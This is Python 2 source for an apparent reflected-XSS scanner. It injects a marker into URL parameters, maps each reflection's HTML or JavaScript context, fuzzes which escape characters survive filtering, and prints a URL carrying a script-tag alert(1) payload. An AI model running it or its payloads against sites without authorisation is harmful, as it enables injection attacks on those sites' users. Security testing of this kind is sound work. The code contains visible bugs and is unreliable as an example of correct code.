#!/usr/bin/env python
from urlparse import urlparse, parse_qs, ParseResult
from urllib import urlencode, quote_plus
from copy import copy
import threading
import os, binascii
import hashlib
import random
import string
import util
import time
""" Class containing necessary metadata for each attack vector
Purpose: Each time an input is reflected in the html, that reflection
receives its own context. This is because each location may be subject
to different filtering, and each will definitely have a different
"escape route"
"""
class AttackContext:
    # Context essentially refers to the attack location 
    parent = None      # Parent used to reference variables
    data = ''          # Raw HTML
    depth = 0          # Length of local_html string
    local_html = None  # Hash of html data before the cookie position
                       # Used to locate proper pos on additional requests
    # Initial data parsing variables
    tag = ''           # Direct Parent Tag
    tag_closed = False # Has the open parent tag been closed
    is_js = False      # In a javascript context
    in_value = True    # Has iteration passed the assignment
    delimiter = ''     # Is the input encapsulated by ' or "
    key = 'zxz'        # identifier for context and attack string

    # Filter Fuzzing variables
    fuzz_str = ''      # String containing current fuzzer attack
    fuzz_payload = ''  # String containing fuzzer url payload
    attack_str = ''    # String demonstrating successful attack
    ''' f - filter avoidance list
    Value is a tuple of (attack_char, passed_filter ) where passed
    filter means that it successfuly reflected onto the page '''
    f = list()

    # Initialize class variables and parse current context
    def __init__(self, parent, pos):
        self.parent = parent
        #self.key = gen_key()
        d = 0 # Distance from initial pos

        for i in reversed(parent.data[0:pos]):
            d += 1
            if i == '>': # Parent tag is closed
                self.tag_closed = True
            elif i == '<': # Look complete, because tag found
                self.set_tag(pos-d+1, pos)
                break
            elif i == '{': # JavaScript context
                self.is_js = True
            elif i == '=': # Value assignment complete
                self.in_value = False
            # Checking value delimiter
            elif i == '\'' or i == '\"' and self.in_value:
                self.delimiter = i
        # String equality is O(n), so using hash for quick comparison
        self.local_html = hashlib.md5(self.parent.data[pos-d: pos]) \
                                 .hexdigest()
        self._ = self.parent.data[pos-d: pos]
        self.depth = d
        self.set_target_chars() # Identify fuzzer characters

    # Set the Parent tag for the current context
    def set_tag(self, start, end):
        # Split using space as delimiter
        no_space = self.parent.data[start:end].split(' ')
        tag = no_space[0]
        
        # If tag is closed, make sure closing tag isn't included
        if self.tag_closed:
            tag = tag.split('>')[0]
        
        self.tag = tag # Tag set

    # Determine necessary characters for escape
    def set_target_chars(self):
        if self.delimiter != '':
            self.f.append([self.delimiter, self.delimiter, False])
        else: 
            self.f.append(['','', True]) # Dummy var

        if self.tag_closed: # Inside of tag content section
            # Need chars: < / > script
            self.f.extend([['<','<',False],
                           ['/','/',False],
                           ['>','>',False],
                           ['script','script',False]])
        else: # Desired objective is to introduce new attr
            # TODO for these you don't need to escape completely, you
            # can instead just introduce a new attribute like onerror
            self.f.extend([['<','<',False],
                           ['/','/',False],
                           ['>','>',False],
                           ['script','script',False]])

        if self.is_js:
            self.f.append([';',';',False])
            print 'JS_CONTEXT --set_target_chars'
    
    # Construct a fuzzing string to account for filtering
    def make_fuzz_str(self):
        payload = self.parent.cookie + self.key 
        for val in self.f:
            payload += val[1] # tuple index
            payload += self.key
        ret = gen_urls(self.parent.parsed_url, payload, 
                       self.parent.param)
        # gen_urls returns a list of tuples
        self.fuzz_str = ret[0][0] 
        self.fuzz_payload = payload

    # Construct a functional string to introduce an alert script
    def make_atk_str(self):
        # TODO Make sure the is_js scenario has a diferent output
        # Also tag attribute attack also needs different attack
        delim    = self.f[0][1] # ' or " or `
        open_br  = self.f[1][1] # <
        slash    = self.f[2][1] # /
        close_br = self.f[3][1] # >
        script   = self.f[4][1] # script
        close    = ''           # </_tag_> or /> or blank
        if self.tag_closed:
            close = open_br + slash + self.tag + close_br
        else: 
            close = slash + close_br
        alert = close + open_br + script + close_br + 'alert(1)' +  \
                open_br + slash + script + close_br
        ret = gen_urls(self.parent.parsed_url, alert, 
                       self.parent.param)
        print ret[0][0]

    # Fuzz the context using the fuzzer string
    def fuzz_context(self):
        success = False
        self.make_fuzz_str()    # Construct fuzzer string
        self.data = self.parent.queue.delay_conn_data(self.fuzz_str)
        cookie_pos = 0
        
        # String match necessary because using a static pos is unreliable
        match = util.string_match(self.data, self.parent.cookie)
        for pos in match: # Find all reflections in the HTML
            hash_data = hashlib.md5(self.data[pos-self.depth: pos]) \
                               .hexdigest()
            if hash_data == self.local_html:
                success = True
                cookie_pos = pos
                break
        if not success:
            print 'Match not found.'
            #print self.data
            return success # fuzzing failure, context will be removed
        # Getting parameters from data
        reflected = self.data[cookie_pos:                         \
                         cookie_pos + len(self.fuzz_payload) * 3] \
                        .split(self.key)[1:-1]
        if len(reflected) != len(self.f):
            # TODO debug whatever is causing this to generated mismatch
            # https://stackoverflow.com/users/login?ssrc=head&returnurl=b2ec
            print ' Size mismatch -- Probably a bug'
            print str(reflected)
            print self.fuzz_str
            print self.parent.url
            return False # for now
        print ' ----------- '
        reflect_cnt = 0
        # Check reflection success and apply input modification
        for i, val in enumerate(reflected):
            # Only check characters that haven't been reflected yet
            if not self.f[i][2]:
                # If reflection matches target character
                if val == self.f[i][0] or val == quote_plus(self.f[i][0]):
                    print 'match ' + val
                    self.f[i][2] = True # Val successfully reflected
                    reflect_cnt += 1
                else:
                    pass
                    # Apply bypass stuff
            else:
                reflect_cnt += 1
        
        if reflect_cnt == len(self.f):
            self.make_atk_str()

        return True # Context will not be deleted

# Class containing Attack URLs with their associated metadata
class AttackURL:
    queue = None # DictQueue object
    parsed_url = None
    attempt_cnt = 0         # Number of attempts; Used for sorting
    lock = threading.Lock() # lock used with attempt_cnt updating
    cookie = str(binascii.b2a_hex(os.urandom(2))) # Generate cookie
    url = ''
    visited = False
    data = ''               # html data
    param = ''              # Param modified for the current url 
    atk_contexts = list()   # list of AttackContext objects
    # Necessary to have a list of attack points because an input may be 
    # reflected at multiple points in the response, and each may be subject
    # to different filtering methods. 

    def __init__(self, queue, parsed_url, url, param):
        self.queue = queue
        self.parsed_url = parsed_url
        self.url = url
        self.param = param

    def set_data(self, data):
        self.data = data
        visited = True

    # If a single input is reflected multiple times, each reflection 
    # receives its own context object containing unique attack data
    def init_context(self):
        reflected = False
        if self.data == None or self.data == '':
            return False
        
        # Find all cookie reflections in the HTML
        match = util.string_match(self.data, self.cookie)
        for pos in match:
            reflected = True
            context = AttackContext(self, pos)
            self.atk_contexts.append(context) # Add to list of attack contexts

        if not reflected: # Unsuccesful -- No instances of reflection
            return False
        else:             # Succesful -- Reflected within HTML
            return True

    # Generates an attack object(s) as a list of parameterized URLs
    @staticmethod
    def create(queue, parsed_url, params):
        atk_objs = list()
        p = parsed_url
        # Changing each argument value to the cookie
        attack_dict = dict()
        url_list = gen_urls(p, AttackURL.cookie) 
        for url, param  in url_list:
            atk_objs.append(AttackURL(queue, p, url, param))            

        return atk_objs # list containing attack objects

    # Called by attack thread to initiate an attack on a single context
    def attack(self):
        if self.data == '': # Indicates uninitalized context
            self.data = self.queue.delay_conn_data(self.url)
            success = self.init_context()
            if not success: return False 
        new_list = []
        for context in self.atk_contexts:
            if context.fuzz_context(): # Context fuzzed properly readd it
                new_list.append(context)
            # TODO return true or false if need to remove from atk_contexts
        self.atk_contexts = new_list
        self.attempt_cnt += 1 # Increment attempt number
        if self.atk_contexts:
            return True  # True if attackURL should remain on attack list
        else:
            return False # AttackURL failed

# Generate random two character key
def gen_key():
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(3))

# Generate URL(s) with custom query value
# Returns a list of tuple pairs containing url and the parameter changed
def gen_urls(p, value, target_param=''):
    # Make a different URL for each query argument
    query = parse_qs(p.query.encode('utf-8')) 
    url_list = list()
    for param in query.keys(): 
        if target_param == '' or target_param == param:
            new_query_d = copy(query) # Copy of query dictionary
            new_query_d[param] = value
            new_query = urlencode(new_query_d, doseq=True) # New query 
            # Gen and add new url to url list
            url = ParseResult(p.scheme, p.netloc, p.path, p.params,
                              new_query, p.fragment).geturl()
            url_list.append((url, param))

    return url_list # Return full list of all generated urls


